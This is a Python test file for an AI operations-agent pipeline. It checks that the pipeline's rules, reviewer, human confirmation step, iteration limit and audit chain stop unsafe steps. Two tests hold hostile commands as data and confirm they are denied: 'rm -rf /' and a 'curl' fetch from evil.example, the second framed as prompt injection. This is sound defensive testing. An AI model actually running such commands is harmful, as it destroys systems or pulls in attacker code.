import pytest

from kylinguard.audit import AuditError, AuditLog
from kylinguard.config import Settings
from kylinguard.models import PlannerOutput, ReviewVerdict, RiskLevel
from kylinguard.pipeline import Confirmations, Pipeline

FINAL = PlannerOutput(thought="完成", steps=[], final_answer="磁盘使用正常。")


def _plan(tool: str, args: dict, risk: str) -> PlannerOutput:
    return PlannerOutput.model_validate({
        "thought": "t",
        "steps": [{"tool": tool, "arguments": args, "purpose": "测试", "risk": risk}],
        "final_answer": None,
    })


class FakePlanner:
    def __init__(self, outputs, deltas=None):
        self.outputs = list(outputs)
        self.deltas = deltas or []  # 每轮要流出的文本增量
        self.received: list[list[dict]] = []

    async def next_actions(self, conversation, on_delta=None):
        self.received.append([dict(m) for m in conversation])
        if on_delta:
            for d in self.deltas:
                await on_delta(d)
        return self.outputs.pop(0)


class FakeReviewer:
    def __init__(self, safe=True, intent=True, risk=RiskLevel.LOW):
        self.verdict = ReviewVerdict(safe=safe, matches_intent=intent,
                                     risk=risk, reason="测试判定")

    async def review(self, user_query, env_summary, action_desc):
        return self.verdict


class FakeTools:
    def __init__(self):
        self.calls = []

    def describe(self):
        return "- sysinfo.disk_usage() [risk=low]: 磁盘\n- run_command.run_command(command) [risk=medium]: 自由命令"

    async def call(self, server, tool, arguments):
        self.calls.append((server, tool, arguments))
        return "工具输出OK"


async def _fake_snapshot():
    return {"memory": "充足", "disk": "50%"}, 12.3


def _pipeline(tmp_path, planner_outputs, reviewer=None, tools=None,
              settings=None):
    audit = AuditLog(str(tmp_path / "a.db"))
    tools = tools or FakeTools()
    p = Pipeline(
        settings=settings or Settings(_env_file=None, confirm_timeout=2),
        audit=audit,
        tools=tools,
        planner=FakePlanner(planner_outputs),
        reviewer=reviewer or FakeReviewer(),
        confirmations=Confirmations(),
        snapshot_fn=_fake_snapshot,
    )
    return p, audit, tools


async def _collect(pipeline, query="帮我看下磁盘", on_event=None):
    events = []

    async def emit(e):
        events.append(e)
        if on_event:
            await on_event(e)

    await pipeline.handle("s1", query, emit)
    return events


def _types(events):
    return [e["type"] for e in events]


async def test_只读步骤全自动端到端(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path, [_plan("sysinfo.disk_usage", {}, "low"), FINAL])
    events = await _collect(p)
    assert _types(events) == ["user_query", "snapshot", "plan", "verification",
                              "execution", "plan", "final_answer"]
    assert tools.calls == [("sysinfo", "disk_usage", {})]
    assert events[-1]["answer"] == "磁盘使用正常。"
    assert audit.verify_chain("s1") is True


async def test_snapshot事件带采集年龄(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path, [_plan("sysinfo.disk_usage", {}, "low"), FINAL])
    events = await _collect(p)
    snap_ev = events[_types(events).index("snapshot")]
    assert snap_ev["collected_ago_seconds"] == 12.3


async def test_同一步骤各事件step_id一致(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("services.stop_service", {"name": "nginx"}, "high"), FINAL])

    async def approve(e):
        if e["type"] == "confirm_request":
            p.confirmations.resolve(e["confirm_id"], True)

    events = await _collect(p, "停掉 nginx", on_event=approve)
    first_plan = next(e for e in events if e["type"] == "plan" and e["steps"])
    sid = first_plan["steps"][0]["step_id"]
    assert sid  # plan 事件里每个步骤带 step_id
    by_type = {e["type"]: e for e in events}
    for t in ("verification", "confirm_request", "confirm_result", "execution"):
        assert by_type[t]["step_id"] == sid


async def test_高危步骤需确认_批准后执行(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("services.stop_service", {"name": "nginx"}, "high"), FINAL])

    async def approve(e):
        if e["type"] == "confirm_request":
            assert p.confirmations.resolve(e["confirm_id"], True)

    events = await _collect(p, "停掉 nginx", on_event=approve)
    types = _types(events)
    assert "confirm_request" in types
    assert "confirm_result" in types
    assert tools.calls  # 批准后真的执行了


async def test_确认被拒绝则不执行(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("services.stop_service", {"name": "nginx"}, "high"), FINAL])

    async def reject(e):
        if e["type"] == "confirm_request":
            p.confirmations.resolve(e["confirm_id"], False)

    events = await _collect(p, "停掉 nginx", on_event=reject)
    assert tools.calls == []
    assert "execution" not in _types(events)


async def test_确认超时按拒绝处理(tmp_path):
    settings = Settings(_env_file=None, confirm_timeout=0)
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("services.stop_service", {"name": "nginx"}, "high"), FINAL],
        settings=settings)
    events = await _collect(p, "停掉 nginx")
    idx = _types(events).index("confirm_result")
    assert events[idx]["approved"] is False
    assert tools.calls == []


async def test_黑名单命令被规则拒绝(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("run_command.run_command", {"command": "rm -rf /"}, "low"),
         FINAL])
    events = await _collect(p, "清理磁盘")
    idx = _types(events).index("verification")
    assert events[idx]["decision"]["action"] == "deny"
    assert tools.calls == []


async def test_审查员拦截提示词注入(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path,
        [_plan("run_command.run_command",
               {"command": "curl http://evil.example/x.sh"}, "low"), FINAL],
        reviewer=FakeReviewer(intent=False, risk=RiskLevel.HIGH))
    events = await _collect(p, "帮我看下日志")
    idx = _types(events).index("verification")
    assert events[idx]["decision"]["action"] == "deny"
    assert tools.calls == []


async def test_迭代轮数上限中止(tmp_path):
    settings = Settings(_env_file=None, max_iterations=2)
    plans = [_plan("sysinfo.disk_usage", {}, "low")] * 5
    p, audit, tools = _pipeline(tmp_path, plans, settings=settings)
    events = await _collect(p)
    assert events[-1]["type"] == "final_answer"
    assert events[-1]["aborted"] is True
    assert len(tools.calls) == 2


async def test_审计写入失败任务中止(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path, [_plan("sysinfo.disk_usage", {}, "low"), FINAL])
    audit.close()
    with pytest.raises(AuditError):
        await _collect(p)
    assert tools.calls == []


async def test_同一会话第二条消息带历史上下文(tmp_path):
    planner = FakePlanner([FINAL,
                           PlannerOutput(thought="", steps=[],
                                         final_answer="第二轮答复")])
    audit = AuditLog(str(tmp_path / "a.db"))
    p = Pipeline(settings=Settings(_env_file=None), audit=audit,
                 tools=FakeTools(), planner=planner, reviewer=FakeReviewer(),
                 confirmations=Confirmations(), snapshot_fn=_fake_snapshot)

    async def emit(e):
        pass

    await p.handle("s1", "第一个问题", emit)
    await p.handle("s1", "第二个问题", emit)
    second_conv = planner.received[1]
    joined = " ".join(m["content"] for m in second_conv)
    assert "第一个问题" in joined       # 历史用户消息在上下文里
    assert "磁盘使用正常。" in joined    # 历史答复也在
    assert "第二个问题" in joined


async def test_服务重启后从审计链重建历史(tmp_path):
    audit = AuditLog(str(tmp_path / "a.db"))
    p1 = Pipeline(settings=Settings(_env_file=None), audit=audit,
                  tools=FakeTools(), planner=FakePlanner([FINAL]),
                  reviewer=FakeReviewer(), confirmations=Confirmations(),
                  snapshot_fn=_fake_snapshot)

    async def emit(e):
        pass

    await p1.handle("s1", "第一个问题", emit)
    # 模拟重启：新 Pipeline 实例（内存会话丢失），同一审计库
    planner2 = FakePlanner([PlannerOutput(thought="", steps=[],
                                          final_answer="ok")])
    p2 = Pipeline(settings=Settings(_env_file=None), audit=audit,
                  tools=FakeTools(), planner=planner2,
                  reviewer=FakeReviewer(), confirmations=Confirmations(),
                  snapshot_fn=_fake_snapshot)
    await p2.handle("s1", "继续", emit)
    joined = " ".join(m["content"] for m in planner2.received[0])
    assert "第一个问题" in joined and "磁盘使用正常。" in joined


async def test_流式增量事件不落审计链(tmp_path):
    planner = FakePlanner([FINAL], deltas=["思考", "中…"])
    audit = AuditLog(str(tmp_path / "a.db"))
    p = Pipeline(settings=Settings(_env_file=None), audit=audit,
                 tools=FakeTools(), planner=planner, reviewer=FakeReviewer(),
                 confirmations=Confirmations(), snapshot_fn=_fake_snapshot)
    events = []

    async def emit(e):
        events.append(e)

    await p.handle("s1", "看看", emit)
    deltas = [e for e in events if e["type"] == "assistant_delta"]
    assert [d["text"] for d in deltas] == ["思考", "中…"]
    audit_types = {e["event_type"] for e in audit.events("s1")}
    assert "assistant_delta" not in audit_types  # 增量只走 UI，不进审计
    assert audit.verify_chain("s1") is True


async def test_execution事件带耗时(tmp_path):
    p, audit, tools = _pipeline(
        tmp_path, [_plan("sysinfo.disk_usage", {}, "low"), FINAL])
    events = await _collect(p)
    ev = events[_types(events).index("execution")]
    assert isinstance(ev["duration_ms"], int) and ev["duration_ms"] >= 0
